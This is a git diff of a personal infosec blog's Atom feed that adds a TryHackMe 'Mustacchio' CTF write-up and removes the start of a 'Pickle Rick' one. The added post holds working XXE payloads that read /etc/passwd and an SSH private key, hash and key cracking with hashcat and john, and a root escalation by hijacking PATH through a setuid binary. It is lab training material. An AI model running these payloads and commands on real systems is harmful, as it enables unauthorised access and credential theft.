@@ -1,4 +1,326 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="https://darrynbrownfield.co.uk/feed.xml" rel="self" type="application/atom+xml" /><link href="https://darrynbrownfield.co.uk/" rel="alternate" type="text/html" /><updated>2021-08-08T11:32:54+00:00</updated><id>https://darrynbrownfield.co.uk/</id><title type="html">Darryn Brownfield</title><subtitle>Infosec | Hacking | CTF</subtitle><entry><title type="html">CMSpit Write Up</title><link href="https://darrynbrownfield.co.uk/cmspit" rel="alternate" type="text/html" title="CMSpit Write Up" /><published>2021-08-08T00:00:00+00:00</published><updated>2021-08-08T00:00:00+00:00</updated><id>https://darrynbrownfield.co.uk/cmspit</id><content type="html" xml:base="https://darrynbrownfield.co.uk/cmspit">&lt;p&gt;&lt;img src=&quot;/assets/images/cmspit/cover.png&quot; alt=&quot;cover&quot; /&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="https://darrynbrownfield.co.uk/feed.xml" rel="self" type="application/atom+xml" /><link href="https://darrynbrownfield.co.uk/" rel="alternate" type="text/html" /><updated>2021-08-12T11:21:23+00:00</updated><id>https://darrynbrownfield.co.uk/</id><title type="html">Darryn Brownfield</title><subtitle>Infosec | Hacking | CTF</subtitle><entry><title type="html">Mustacchio Write Up</title><link href="https://darrynbrownfield.co.uk/mustacchio" rel="alternate" type="text/html" title="Mustacchio Write Up" /><published>2021-08-12T00:00:00+00:00</published><updated>2021-08-12T00:00:00+00:00</updated><id>https://darrynbrownfield.co.uk/mustacchio</id><content type="html" xml:base="https://darrynbrownfield.co.uk/mustacchio">&lt;p&gt;&lt;img src=&quot;/assets/images/mustacchio/cover.png&quot; alt=&quot;cover&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/mustacchio&quot;&gt;mustacchio&lt;/a&gt; is a easy rated CTF room on &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt; created by &lt;a href=&quot;https://tryhackme.com/p/zyeinn&quot;&gt;zyeinn&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
+
+&lt;p&gt;Although not required I added the machine IP to my host file so through out the write up I can use mustacchio.thm for consistency. Once added I started a nmap scan to check for available ports.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -sC -sV -oA nmap/initial mustacchio.thm
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-08-12 11:04 BST
+Nmap scan report for mustacchio.thm (10.10.41.138)
+Host is up (0.031s latency).
+Not shown: 998 filtered ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)
+|   256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)
+|_  256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Mustacchio | Home
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.60 seconds
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;2 Ports open:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;22 - SSH - OpenSSH 7.2p2&lt;/li&gt;
+  &lt;li&gt;80 - HTTP - Apache 2.4.18&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;I also ran a full port scan and found 1 additional port:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $nmap -p- -oA nmap/full mustacchio.thm
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-08-12 11:07 BST
+Nmap scan report for mustacchio.thm (10.10.41.138)
+Host is up (0.032s latency).
+Not shown: 65532 filtered ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+8765/tcp open  ultraseek-http
+
+Nmap done: 1 IP address (1 host up) scanned in 119.61 seconds
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;
+
+&lt;p&gt;I started with port 80 and was presented with a very basic web page, there isnt really any functionally on the pages.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/mustacchio/index.png&quot; alt=&quot;index&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I ran a gobuster to check for other directories.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $gobuster dir -u http://mustacchio.thm -w /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -t 75
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://mustacchio.thm
+[+] Threads:        75
+[+] Wordlist:       /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2021/08/12 11:11:22 Starting gobuster
+===============================================================
+/images (Status: 301)
+/fonts (Status: 301)
+/custom (Status: 301)
+/server-status (Status: 403)
+===============================================================
+2021/08/12 11:11:34 Finished
+===============================================================
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;/custom could be interesting.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/mustacchio/custom.png&quot; alt=&quot;custom&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Looking in the js folder I found a file called users.bak, I downloaded the file to my machine.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/mustacchio/usersbak.png&quot; alt=&quot;usersbak&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Its a SQLite database.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $file users.bak 
+users.bak: SQLite 3.x database, last written using SQLite version 3034001
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The database has one table called users with one record which is the username ‘admin’ and a hashed password which ive redacted from the output.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sqlite3 users.bak
+SQLite version 3.31.1 2020-01-27 19:55:54
+Enter &quot;.help&quot; for usage hints.
+sqlite&amp;gt; .tables
+users
+sqlite&amp;gt; select * from users;
+admin|&amp;lt;REDACTED&amp;gt;
+sqlite&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The hash is SHA1, a great tool to use to identify hashes is hash-identifier.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $hash-identifier                                                       
+   #########################################################################
+   #     __  __                     __           ______    _____           #
+   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
+   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
+   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
+   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
+   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
+   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
+   #                                                             By Zion3R #
+   #                                                    www.Blackploit.com #
+   #                                                   Root@Blackploit.com #
+   #########################################################################
+--------------------------------------------------
+ HASH: &amp;lt;REDACTED&amp;gt;
+
+Possible Hashs:
+[+] SHA-1
+[+] MySQL5 - SHA-1(SHA-1($pass))
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I put the hash in a file called ‘hash’ and then used hashcat to crack it with the command &lt;code class=&quot;highlighter-rouge&quot;&gt;hashcat -m 100 hash /usr/share/wordlists/rockyou.txt --force&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;The hash cracked within a few seconds, I looked around the webpage to find somewhere I could use the credentials but couldn’t find anything.&lt;/p&gt;
+
+&lt;p&gt;I turned my attention to the other port 8765 and got an admin panel.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/mustacchio/login.png&quot; alt=&quot;login&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I logged in with the credentials and was presented with a page to add a comment.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/mustacchio/comment.png&quot; alt=&quot;comment&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Looking at the source code, 3 things jumped out.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/mustacchio/source.png&quot; alt=&quot;source&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;1) Another backup file is referenced&lt;/p&gt;
+
+&lt;p&gt;2) A username of Barry and a breadcumb to grab an SSH key if possible&lt;/p&gt;
+
+&lt;p&gt;3) A reference to XML being used&lt;/p&gt;
+
+&lt;p&gt;Clicking submit without any input presents an alert ‘Insert XML Code!’.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/mustacchio/insertcode.png&quot; alt=&quot;insertcode&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I downloaded the dontforget.bak file by browsing to: http://mustacchio.thm:8765/auth/dontforget.bak&lt;/p&gt;
+
+&lt;p&gt;Looking at the file its an XML example.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $cat dontforget.bak 
+&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
+&amp;lt;comment&amp;gt;
+  &amp;lt;name&amp;gt;Joe Hamd&amp;lt;/name&amp;gt;
+  &amp;lt;author&amp;gt;Barry Clad&amp;lt;/author&amp;gt;
+  &amp;lt;com&amp;gt;his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could’ve done something more productive than reading this mindlessl
+y and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now sin
+ce this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could’ve been playin
+g with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that
+ you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.&amp;lt;/com&amp;gt;
+&amp;lt;/comment&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;I tried the example on the webpage and got the expected result.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/mustacchio/test.png&quot; alt=&quot;test&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;initial-access&quot;&gt;Initial Access&lt;/h3&gt;
+
+&lt;p&gt;It appears the next step is to use XML External Entiry (XXE) to grab barry’s SSH key to allow us to connect to the machine. Learning XXE is very much on my to do list so I went over to &lt;a href=&quot;https://portswigger.net/web-security/xxe&quot;&gt;port swigger academy&lt;/a&gt; which has a great training resource and found the following payload:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
+&amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&amp;gt; ]&amp;gt;
+&amp;lt;stockCheck&amp;gt;&amp;lt;productId&amp;gt;&amp;amp;xxe;&amp;lt;/productId&amp;gt;&amp;lt;/stockCheck&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Using the original example and the payload above I created my own payload to test XXE.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
+&amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&amp;gt; ]&amp;gt;
+&amp;lt;comment&amp;gt;
+  &amp;lt;name&amp;gt;Daz&amp;lt;/name&amp;gt;
+  &amp;lt;author&amp;gt;Please work...&amp;lt;/author&amp;gt;
+  &amp;lt;com&amp;gt;&amp;amp;xxe;&amp;lt;/com&amp;gt;
+&amp;lt;/comment&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;It worked!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/mustacchio/testworked.png&quot; alt=&quot;testworked&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I tweaked the payload to grab barrys SSH key.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
+&amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY xxe SYSTEM &quot;file:///home/barry/.ssh/id_rsa&quot;&amp;gt; ]&amp;gt;
+&amp;lt;comment&amp;gt;
+  &amp;lt;name&amp;gt;Daz&amp;lt;/name&amp;gt;
+  &amp;lt;author&amp;gt;Please work...&amp;lt;/author&amp;gt;
+  &amp;lt;com&amp;gt;&amp;amp;xxe;&amp;lt;/com&amp;gt;
+&amp;lt;/comment&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Again this worked, however looking at the key it is encrypted so before I can use it to login I need to crack it.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;  GNU nano 4.9.2                                       
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E
+&amp;lt;redacted&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I used ssh2john to generate a hash and saved it to a file called keyhash.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $/usr/share/john/ssh2john.py key &amp;gt; keyhash
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Then using john and the rockyou wordlist I was able to get the keys password.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $john keyhash --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 2 OpenMP threads
+Note: This format may emit false positives, so it will keep trying even after
+finding a possible candidate.
+Press 'q' or Ctrl-C to abort, almost any other key for status
+&amp;lt;redacted&amp;gt;       (key)
+1g 0:00:00:05 DONE (2021-08-12 11:30) 0.1779g/s 2551Kp/s 2551Kc/s 2551KC/sa6_123..*7¡Vamos!
+Session completed
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;To use the key I used chmod 600 and was able to login.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $chmod 600 key
+┌─[daz@parrot]─[~/Documents/TryHackMe/Mustacchio]
+└──╼ $ssh -i key barry@mustacchio.thm
+Enter passphrase for key 'key': 
+Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-210-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+34 packages can be updated.
+16 of these updates are security updates.
+To see these additional updates run: apt list --upgradable
+
+
+Last login: Thu Aug 12 10:31:58 2021 from 10.8.21.217
+barry@mustacchio:~$ 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&quot;priv-esc&quot;&gt;Priv Esc&lt;/h3&gt;
+
+&lt;p&gt;While enumerating the machine I found another user directory. Within this directory was a ELF file owned by root but executable by all.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;barry@mustacchio:~$ cd /home/joe/
+barry@mustacchio:/home/joe$ ls
+live_log
+barry@mustacchio:/home/joe$ file live_log 
+live_log: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6c03a68094c63347aeb02281a455189
+64ad12abe, for GNU/Linux 3.2.0, not stripped
+barry@mustacchio:/home/joe$ ls -lah live_log 
+-rwsr-xr-x 1 root root 17K Jun 12 15:48 live_log
+barry@mustacchio:/home/joe$ 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Running the file it appears to just be reading the HTTP access logs for port 8765.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;barry@mustacchio:/home/joe$ ./live_log 
+10.8.21.217 - - [12/Aug/2021:10:20:02 +0000] &quot;GET /home.php HTTP/1.1&quot; 200 1077 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0&quot;
+10.8.21.217 - - [12/Aug/2021:10:20:27 +0000] &quot;POST /home.php HTTP/1.1&quot; 200 1077 &quot;http://mustacchio.thm:8765/home.php&quot; &quot;Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefo
+x/68.0&quot;
+10.8.21.217 - - [12/Aug/2021:10:21:00 +0000] &quot;POST /home.php HTTP/1.1&quot; 200 1123 &quot;http://mustacchio.thm:8765/home.php&quot; &quot;Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefo
+x/68.0&quot;
+10.8.21.217 - - [12/Aug/2021:10:23:47 +0000] &quot;GET /auth/dontforget.bak HTTP/1.1&quot; 200 996 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0&quot;
+10.8.21.217 - - [12/Aug/2021:10:25:24 +0000] &quot;POST /home.php HTTP/1.1&quot; 200 1123 &quot;http://mustacchio.thm:8765/home.php&quot; &quot;Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefo
+x/68.0&quot;
+10.8.21.217 - - [12/Aug/2021:10:25:25 +0000] &quot;POST /home.php HTTP/1.1&quot; 200 1563 &quot;http://mustacchio.thm:8765/home.php&quot; &quot;Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefo
+x/68.0&quot;
+10.8.21.217 - - [12/Aug/2021:10:26:37 +0000] &quot;GET /home.php HTTP/1.1&quot; 200 1077 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0&quot;
+10.8.21.217 - - [12/Aug/2021:10:27:01 +0000] &quot;POST /home.php HTTP/1.1&quot; 200 1782 &quot;http://mustacchio.thm:8765/home.php&quot; &quot;Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefo
+x/68.0&quot;
+10.8.21.217 - - [12/Aug/2021:10:27:39 +0000] &quot;GET /home.php HTTP/1.1&quot; 200 1077 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0&quot;
+10.8.21.217 - - [12/Aug/2021:10:28:20 +0000] &quot;POST /home.php HTTP/1.1&quot; 200 2573 &quot;http://mustacchio.thm:8765/home.php&quot; &quot;Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefo
+x/68.0&quot;
+^CLive Nginx Log Readerbarry@mustacchio:/home/joe$ 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I used strings to look at the file and found the line:&lt;/p&gt;
+
+&lt;p&gt;tail -f /var/log/nginx/access.log&lt;/p&gt;
+
+&lt;p&gt;Because the tail command is not using an absolute path, we should be able to get privilege escalation by using the PATH variable. Raj Chandel has a great &lt;a href=&quot;https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/&quot;&gt;blog&lt;/a&gt; about this technique.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;barry@mustacchio:/home/joe$ 
+barry@mustacchio:/home/joe$ cd /tmp
+barry@mustacchio:/tmp$ echo &quot;/bin/bash&quot; &amp;gt; tail
+barry@mustacchio:/tmp$ chmod +x tail 
+barry@mustacchio:/tmp$ export PATH=/tmp:$PATH
+barry@mustacchio:/tmp$ echo $PATH
+/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+barry@mustacchio:/tmp$ /home/joe/live_log 
+root@mustacchio:/tmp# whoami
+root
+root@mustacchio:/tmp# 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Thanks for reading!&lt;/p&gt;</content><author><name>Darryn</name></author><category term="tryhackme" /><category term="ctf" /><category term="easy" /><summary type="html"></summary></entry><entry><title type="html">CMSpit Write Up</title><link href="https://darrynbrownfield.co.uk/cmspit" rel="alternate" type="text/html" title="CMSpit Write Up" /><published>2021-08-08T00:00:00+00:00</published><updated>2021-08-08T00:00:00+00:00</updated><id>https://darrynbrownfield.co.uk/cmspit</id><content type="html" xml:base="https://darrynbrownfield.co.uk/cmspit">&lt;p&gt;&lt;img src=&quot;/assets/images/cmspit/cover.png&quot; alt=&quot;cover&quot; /&gt;&lt;/p&gt;
 
 &lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;
 
@@ -3191,220 +3513,4 @@ __   __               _               _   _                 _____ _
 flag{cec59161d338fef787{REDACTED}
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;p&gt;Thanks for reading!&lt;/p&gt;</content><author><name>Darryn</name></author><category term="tryhackme" /><category term="ctf" /><category term="easy" /><summary type="html"></summary></entry><entry><title type="html">Pickle Rick Write Up</title><link href="https://darrynbrownfield.co.uk/picklerick" rel="alternate" type="text/html" title="Pickle Rick Write Up" /><published>2021-01-06T00:00:00+00:00</published><updated>2021-01-06T00:00:00+00:00</updated><id>https://darrynbrownfield.co.uk/picklerick</id><content type="html" xml:base="https://darrynbrownfield.co.uk/picklerick">&lt;p&gt;&lt;img src=&quot;/assets/images/picklerick/cover.png&quot; alt=&quot;picklerick&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/picklerick&quot;&gt;Pickle Rick&lt;/a&gt; is a easy room on &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt;. I enjoyed this room a lot, it was simple and requires good enumeration. The goal of this room is to:&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;This Rick and Morty themed challenge requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a pickle.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
-
-&lt;p&gt;I deployed the machine and was given the target IP 10.10.116.216. I started a NMAP scan to check the available ports.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -sC -sV -oN initial 10.10.116.216
-Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-06 21:57 GMT
-Nmap scan report for 10.10.116.216
-Host is up (0.026s latency).
-Not shown: 998 closed ports
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   2048 b9:4f:2b:62:18:c3:dd:2e:a2:2c:b5:12:24:12:d0:79 (RSA)
-|   256 de:3b:e3:78:a0:61:ac:71:ee:75:a2:c7:ae:1b:26:40 (ECDSA)
-|_  256 e4:b9:4e:ae:81:bf:32:9d:a6:22:c1:35:d4:92:bb:cf (ED25519)
-80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
-|_http-server-header: Apache/2.4.18 (Ubuntu)
-|_http-title: Rick is sup4r cool
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 8.89 seconds
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;2 Ports open:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;22 - SSH - Banner is showing its an Ubuntu machine&lt;/li&gt;
-  &lt;li&gt;80 - HTTP - Apache web server version 2.4.18&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;I also ran a full port scan but no additional ports were found.&lt;/p&gt;
-
-&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;
-
-&lt;p&gt;I started off by looking at the web server, going to http://10.10.116.216 presents the following page:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/picklerick/webpage.png&quot; alt=&quot;webpage&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Nothing of great interest so I looked at the source.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;
-&amp;lt;html lang=&quot;en&quot;&amp;gt;
-&amp;lt;head&amp;gt;
-  &amp;lt;title&amp;gt;Rick is sup4r cool&amp;lt;/title&amp;gt;
-  &amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;
-  &amp;lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&amp;gt;
-  &amp;lt;link rel=&quot;stylesheet&quot; href=&quot;assets/bootstrap.min.css&quot;&amp;gt;
-  &amp;lt;script src=&quot;assets/jquery.min.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
-  &amp;lt;script src=&quot;assets/bootstrap.min.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
-  &amp;lt;style&amp;gt;
-  .jumbotron {
-    background-image: url(&quot;assets/rickandmorty.jpeg&quot;);
-    background-size: cover;
-    height: 340px;
-  }
-  &amp;lt;/style&amp;gt;
-&amp;lt;/head&amp;gt;
-&amp;lt;body&amp;gt;
-
-  &amp;lt;div class=&quot;container&quot;&amp;gt;
-    &amp;lt;div class=&quot;jumbotron&quot;&amp;gt;&amp;lt;/div&amp;gt;
-    &amp;lt;h1&amp;gt;Help Morty!&amp;lt;/h1&amp;gt;&amp;lt;/br&amp;gt;
-    &amp;lt;p&amp;gt;Listen Morty... I need your help, I've turned myself into a pickle again and this time I can't change back!&amp;lt;/p&amp;gt;&amp;lt;/br&amp;gt;
-    &amp;lt;p&amp;gt;I need you to &amp;lt;b&amp;gt;*BURRRP*&amp;lt;/b&amp;gt;....Morty, logon to my computer and find the last three secret ingredients to finish my pickle-reverse potion. The only problem is,
-    I have no idea what the &amp;lt;b&amp;gt;*BURRRRRRRRP*&amp;lt;/b&amp;gt;, password was! Help Morty, Help!&amp;lt;/p&amp;gt;&amp;lt;/br&amp;gt;
-  &amp;lt;/div&amp;gt;
-
-  &amp;lt;!--
-
-    Note to self, remember username!
-
-    Username: R1c&amp;lt;REDACTED&amp;gt;
-
-  --&amp;gt;
-
-&amp;lt;/body&amp;gt;
-&amp;lt;/html&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;I will take a note of the username as will probably be required later on, nothing else seems to jump out at the moment on an initial glance. Although ‘Burp’ got me thinking maybe I need to send the request via burp suite and play with the request but if I get stuck I will come back to that. I did some basic web enumeration first by trying common things such as checking robots.txt.&lt;/p&gt;
-
-&lt;p&gt;Robots.txt had a single word:&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Wubbalu   « I have redacted part the output&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;I could see from the source code a assets folder to I had a look at http://10.10.116.216/assets&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/picklerick/assets.png&quot; alt=&quot;assets&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Nothing else jumped out so I ran a gobuster.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $gobuster dir -u http://10.10.116.216 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
-===============================================================
-Gobuster v3.0.1
-by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
-===============================================================
-[+] Url:            http://10.10.116.216
-[+] Threads:        50
-[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-[+] Status codes:   200,204,301,302,307,401,403
-[+] User Agent:     gobuster/3.0.1
-[+] Timeout:        10s
-===============================================================
-2021/01/06 21:58:27 Starting gobuster
